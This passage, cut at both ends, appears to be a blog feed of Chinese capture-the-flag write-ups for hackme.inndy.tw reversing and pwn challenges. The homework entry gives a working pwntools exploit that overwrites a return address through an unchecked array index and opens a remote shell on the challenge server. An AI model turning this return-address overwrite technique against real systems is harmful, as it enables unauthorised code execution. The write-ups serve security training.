          <category> RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>passthis</title>
      <link href="/2019/10/11/passthis/"/>
      <url>/2019/10/11/passthis/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-passthis"><a href="#src-hackme-passthis" class="headerlink" title="[src = hackme] passthis"></a>[src = hackme] passthis</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>You should be able to pass this</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>直接IDA–&gt;F5，得到一大段代码，仔细查看，有用的就是下面部分：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Let me check your flag: "</span>, v9);</span><br><span class="line">fgets(v10, <span class="number">1023</span>, (FILE *)iob[<span class="number">0</span>]._ptr);</span><br><span class="line">  <span class="keyword">if</span> ( v10[<span class="number">0</span>] &gt; <span class="number">0xD</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v10[<span class="number">0</span>] == <span class="string">'F'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      v5 = <span class="number">9217</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = (<span class="keyword">unsigned</span> __int8)v10[++v4];</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)v6 &lt;= <span class="number">0xD</span>u )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( _bittest(&amp;v5, v6) )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( ((<span class="keyword">unsigned</span> __int8)byte_404040[v4] ^ (<span class="keyword">unsigned</span> __int8)v6) == <span class="number">0x87</span>u );</span><br><span class="line">    &#125;</span><br><span class="line">......（省略）</span><br><span class="line">LABEL_9:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Good flag ;)"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>其中v10这个数组就是flag，首先判断其首字母是不是‘F’，如果是的话进入循环，我们看到，需要输入的flag满足while的条件，然后才有机会挑战到LABEL_9，(即 goto LABEL_9;)  。所以关键是while里面的循环做了什么操作。其实可以看出，while的条件就是将byte_404040数组里面的每个字节跟flag数组V10的每个字节（在循环中被赋值给v6）进行XOR操作要求结果是0x87u。</p><p>所以根据XOR的性质，v6=byte_404040[v4]^0x87u即可，所以从程序的hex-view中把byte_404040数组的内容取出来，然后使用python写下面脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">0xC1</span>,<span class="number">0xCB</span>,<span class="number">0xC6</span>,<span class="number">0xC0</span>,<span class="number">0xFC</span>,<span class="number">0xC9</span>,<span class="number">0xE8</span>,<span class="number">0xAB</span>,<span class="number">0xA7</span>,<span class="number">0xDE</span>,<span class="number">0xE8</span>,<span class="number">0xF2</span>,<span class="number">0xA7</span>,<span class="number">0xF4</span>,<span class="number">0xEF</span>,<span class="number">0xE8</span>,<span class="number">0xF2</span>,<span class="number">0xEB</span>,<span class="number">0xE3</span>,<span class="number">0xA7</span>,<span class="number">0xE9</span>,<span class="number">0xE8</span>,<span class="number">0xF3</span>,<span class="number">0xA7</span>,<span class="number">0xF7</span>,<span class="number">0xE6</span>,<span class="number">0xF4</span>,<span class="number">0xF4</span>,<span class="number">0xA7</span>,<span class="number">0xF3</span>,<span class="number">0xEF</span>,<span class="number">0xE2</span>,<span class="number">0xA7</span>,<span class="number">0xE1</span>,<span class="number">0xEB</span>,<span class="number">0xE6</span>,<span class="number">0xE0</span>,<span class="number">0xFA</span>,<span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag+=chr(i^<span class="number">0x87</span>)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>运行输出flag。</p>]]></content>
      
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> IDA </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>simple-rev</title>
      <link href="/2019/10/11/simple-rev/"/>
      <url>/2019/10/11/simple-rev/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-simple-rev"><a href="#src-hackme-simple-rev" class="headerlink" title="[src = hackme] simple-rev"></a>[src = hackme] simple-rev</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>A little bit harder</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>直接IDA–&gt;F5，得到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> checking[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>]; <span class="comment">// [esp+4Ch] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+8Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What is flag? "</span>);</span><br><span class="line">  fgets(buffer, <span class="number">63</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; buffer[i]; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buffer[i] == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      buffer[i] = <span class="number">0</span>;</span><br><span class="line">      checking[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      checking[i] = buffer[i] + <span class="number">1</span>;  <span class="comment">//简单的移位，只需要反向移位即可得到flag</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(checking, <span class="string">"UIJT.JT.ZPVS.GMBH"</span>) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"FLAG&#123;%s&#125;\n"</span>, buffer);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try hard."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用python解决：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"UIJT.JT.ZPVS.GMBH"</span></span><br><span class="line">r = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    r += chr(ord(i) - <span class="number">1</span>)</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure><p>输出flag。</p>]]></content>
      
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> IDA </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>homework</title>
      <link href="/2019/10/10/homework/"/>
      <url>/2019/10/10/homework/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-homework"><a href="#src-hackme-homework" class="headerlink" title="[src = hackme] homework"></a>[src = hackme] homework</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc hackme.inndy.tw 7701</span><br></pre></td></tr></table></figure><p>Source Code, Index out bound, Return Address</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>题目提示查看源代码，并且注意索引越界（Index out bound），返回地址。<br>查看源代码，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run_program</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">10</span>], i, v, act;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        arr[i] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        ......省略</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;act);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(act) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Index to edit: "</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;i);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"How many? "</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v);</span><br><span class="line">                arr[i] = v;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">         ......省略</span><br></pre></td></tr></table></figure><p>发现run_program()中定义了一个数组arr[10], 下面可以通过输入设置其值。但是在case1中赋值时没有检查index的值，导致可以输入任意的索引值，即导致任意地址读写。</p><p>而且在题目的源码中还给出了一个打开shell的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">call_me_maybe</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此只要通过选择合适的Index的值，使得arr[Index]的位置巧合是run_program()函数的返回地址，并且将其值设置为call_me_maybe()的地址，则在run_program()返回时，将调用call_me_maybe()打开shell。<br>然后按照PWN的基本思路，在shell中通过cat flag获取flag即可。</p><p>这需要解决两个问题：</p><ol><li>call_me_maybe()的地址；</li><li>run_program()函数返回时返回地址与数组arr[10]的index的关系。</li></ol><p>第一个问题很容易解决，直接IDA打开homework的二进制程序，就可以看到，如图：<br><img src="./homework1.PNG" alt="homework"><br>可以看到call_me_maybe()的地址为0x080485FB。</p><p>第二个问题：获取run_program()函数返回时返回地址与数组arr[10]的index的关系可以通过运行可执行文件，并使用gdb进行调试得到。为了提高调试效率，建议安装gdb的插件pwndbg，具体安装方法可以查阅相关资料，不再赘述。</p><p>首先根据IDA找到case1，在jmp指令（0x080487AF）的位置下断点，来确定index与返回地址位置的关系：</p><p><img src="./homework2.PNG" alt="homework"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~/hackme/homework$ gdb -q ./homework</span><br><span class="line">pwndbg: loaded 173 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">Reading symbols from ./homework...done.</span><br><span class="line">pwndbg&gt; b *0x080487AF</span><br><span class="line">Breakpoint 1 at 0x80487af: file pwn-easy.c, line 59.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/bitsec/hackme/homework/homework </span><br><span class="line">What<span class="string">'s your name? bitsec</span></span><br><span class="line"><span class="string">0 &gt; exit</span></span><br><span class="line"><span class="string">1 &gt; edit number</span></span><br><span class="line"><span class="string">2 &gt; show number</span></span><br><span class="line"><span class="string">3 &gt; sum</span></span><br><span class="line"><span class="string">4 &gt; dump all numbers</span></span><br><span class="line"><span class="string"> &gt; 1</span></span><br><span class="line"><span class="string">Index to edit: 1</span></span><br><span class="line"><span class="string">How many? 1</span></span><br></pre></td></tr></table></figure><p>此时栈状态如图：</p><p><img src="./homework3.PNG" alt="homework"></p><p>可以看出arr[0]的相对地址为0014，返回地址（标识ebp下面的地址）为004c，差为0x38/4=0xe=14.即arr[14]的位置为返回地址的位置，所以只要将arr[14]赋值为0x080485FB（call_me_maybe()的入口地址，对应的10进制为134514171）就可以打开shell。</p><p>其实熟悉栈帧排布的话，直接从IDA–&gt;F5，得到的run_program的源码也能分析出来。如图：</p><p><img src="./homework4.PNG" alt="homework"></p><p>可以看到arr在举例ebp为34h的位置，而ebp下紧挨着就是放回地址，即在ebp+4的位置。所以差为34h+4h=38h，得到同样的结果。</p><p>不要忘记，填充完毕之后，还要输入一个0，执行exit，才能从run_program返回，得到shell。</p><p>具体过程如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~/hackme/homework$ nc hackme.inndy.tw 7701</span><br><span class="line">What<span class="string">'s your name? bitsec</span></span><br><span class="line"><span class="string">0 &gt; exit</span></span><br><span class="line"><span class="string">1 &gt; edit number</span></span><br><span class="line"><span class="string">2 &gt; show number</span></span><br><span class="line"><span class="string">3 &gt; sum</span></span><br><span class="line"><span class="string">4 &gt; dump all numbers</span></span><br><span class="line"><span class="string"> &gt; 1</span></span><br><span class="line"><span class="string">Index to edit: 14</span></span><br><span class="line"><span class="string">How many? 134514171</span></span><br><span class="line"><span class="string">0 &gt; exit</span></span><br><span class="line"><span class="string">1 &gt; edit number</span></span><br><span class="line"><span class="string">2 &gt; show number</span></span><br><span class="line"><span class="string">3 &gt; sum</span></span><br><span class="line"><span class="string">4 &gt; dump all numbers</span></span><br><span class="line"><span class="string"> &gt; 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cat flag</span></span><br><span class="line"><span class="string">FLAG&#123;Yoooo, Index Over Flow in my home work......OeAbaFeGeLaF9dEQ&#125;</span></span><br></pre></td></tr></table></figure><p>其实很多情况下通过使用python的pwntool包写pwn的exp程序更有效，上面的过程可以通过下面的代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process("./homework")    #local debug</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"hackme.inndy.tw"</span>, <span class="number">7701</span>)  <span class="comment">#remote debug</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Input Name</span></span><br><span class="line">io.recvuntil(<span class="string">"name? "</span>)</span><br><span class="line">io.sendline(<span class="string">"Any String"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite return address</span></span><br><span class="line">io.recvuntil(<span class="string">"dump all numbers"</span>)</span><br><span class="line">io.recvuntil(<span class="string">" &gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"edit: "</span>)</span><br><span class="line">io.sendline(<span class="string">"14"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"How many? "</span>)</span><br><span class="line">system_addr = <span class="number">0x080485FB</span></span><br><span class="line">io.sendline(str(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#exit</span></span><br><span class="line">io.recvuntil(<span class="string">"dump all numbers"</span>)</span><br><span class="line">io.recvuntil(<span class="string">" &gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~/hackme/homework$ python homework_exp.py </span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7701: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">flag</span><br><span class="line">homework</span><br><span class="line">run.sh</span><br><span class="line">$ cat flag</span><br><span class="line">FLAG&#123;Yoooo, Index Over Flow <span class="keyword">in</span> my home work......OeAbaFeGeLaF9dEQ&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nc </tag>
            
            <tag> cat </tag>
            
            <tag> python </tag>
            
            <tag> stack overflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>catflag</title>
      <link href="/2019/10/10/catflag/"/>
      <url>/2019/10/10/catflag/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-catflag"><a href="#src-hackme-catflag" class="headerlink" title="[src = hackme] catflag"></a>[src = hackme] catflag</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc hackme.inndy.tw 7709</span><br></pre></td></tr></table></figure><p>Try using nc connect to server!</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>题目已经说得很清楚，直接nc链接然后cat flag即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~$ nc hackme.inndy.tw 7709</span><br><span class="line">plz capture the flag after 5 seconds...</span><br><span class="line">plz capture the flag after 4 seconds...</span><br><span class="line">plz capture the flag after 3 seconds...</span><br><span class="line">plz capture the flag after 2 seconds...</span><br><span class="line">plz capture the flag after 1 seconds...</span><br><span class="line">cat flag</span><br><span class="line">FLAG&#123;cat flag? dog flag!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nc </tag>
            
            <tag> cat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scoreboard</title>
      <link href="/2019/10/10/scoreboard/"/>
      <url>/2019/10/10/scoreboard/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-scoreboard"><a href="#src-hackme-scoreboard" class="headerlink" title="[src = hackme] scoreboard"></a>[src = hackme] scoreboard</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>DO NOT ATTACK or SCAN scoreboard, you don’t need to do that.</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>提示不用抓包，前面已经看过网页源代码和其中的js文件，在本页面还有flag的话考虑是否在HTTP的header里面，因此直接火狐浏览器–&gt;F12. 刷新<a href="https://hackme.inndy.tw/scoreboard/" target="_blank" rel="noopener">https://hackme.inndy.tw/scoreboard/</a>页面，在响应头发现flag：</p><p><img src="./scoreboard.PNG" alt="scoreboard"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核对HTTP协议的理解，掌握查看HTTP请求头和响应头的方法。</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>helloworld</title>
      <link href="/2019/10/10/helloworld/"/>
      <url>/2019/10/10/helloworld/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-helloworld"><a href="#src-hackme-helloworld" class="headerlink" title="[src = hackme] helloworld"></a>[src = hackme] helloworld</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Guess a number please :D</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>二进制程序，首先用IDA打开，查看流程，发现这是32位ELF文件。本题为入门题，可以直接使用IDA的F5功能，查看程序流程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">29</span>]; <span class="comment">// [esp+Bh] [ebp-2Dh]</span></span><br><span class="line">  <span class="keyword">int</span> n; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)flag = <span class="number">0xC881E8F1</span>;</span><br><span class="line">  *(_DWORD *)&amp;flag[<span class="number">4</span>] = <span class="number">0xCECF81D2</span>;</span><br><span class="line">  *(_DWORD *)&amp;flag[<span class="number">8</span>] = <span class="number">0x81C081D5</span>;</span><br><span class="line">  *(_DWORD *)&amp;flag[<span class="number">12</span>] = <span class="number">0xC8D5C0D3</span>;</span><br><span class="line">  *(_DWORD *)&amp;flag[<span class="number">16</span>] = <span class="number">0xCDC0CFCE</span>;</span><br><span class="line">  *(_DWORD *)&amp;flag[<span class="number">20</span>] = <span class="number">0xCCD4CF81</span>;</span><br><span class="line">  *(_DWORD *)&amp;flag[<span class="number">24</span>] = <span class="number">0x8FD3C4C3</span>;</span><br><span class="line">  flag[<span class="number">28</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What is magic number? "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">  <span class="keyword">if</span> ( n == <span class="number">0x12B9B0A1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; flag[i]; ++i )</span><br><span class="line">      flag[i] ^= n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Flag is FLAG&#123;%s&#125;\n"</span>, flag);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try Hard."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出程序首先要求输入一个数n，然后跟数值0x12B9B0A1比较，如果相等，则对flag数组的每一个元素（字节）与n进行XOR运算，就可以得到flag（需要注意的是因为flag数组的每个元素为一个字节，所以虽然与n进行XOR，实际起作用的只有n的低位字节，即0xA1）。<br>所以只需要写一个脚本完成这个过程即可。</p><p>我们使用Python完成该部分脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">a = [<span class="number">0xC881E8F1</span>,  <span class="comment">#可以看出是flag经过XOR异或加密得到的密文</span></span><br><span class="line"><span class="number">0xCECF81D2</span>,</span><br><span class="line"><span class="number">0x81C081D5</span>,</span><br><span class="line"><span class="number">0xC8D5C0D3</span>,</span><br><span class="line"><span class="number">0xCDC0CFCE</span>,</span><br><span class="line"><span class="number">0xCCD4CF81</span>,</span><br><span class="line"><span class="number">0x8FD3C4C3</span>]</span><br><span class="line"></span><br><span class="line">t = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    t += pack(<span class="string">"&lt;I"</span>,i).decode(<span class="string">'ISO-8859-1'</span>)  <span class="comment">#strcut的pack可以很好的处理C语言等的结构体，这里将其分解成字节，并连接成一个字符串。</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(t)):</span><br><span class="line">    flag += chr(ord(t[i])^<span class="number">0xa1</span>) <span class="comment">#对t字符串的每个字符（即字节）进行异或运算得到初始的flag</span></span><br><span class="line"></span><br><span 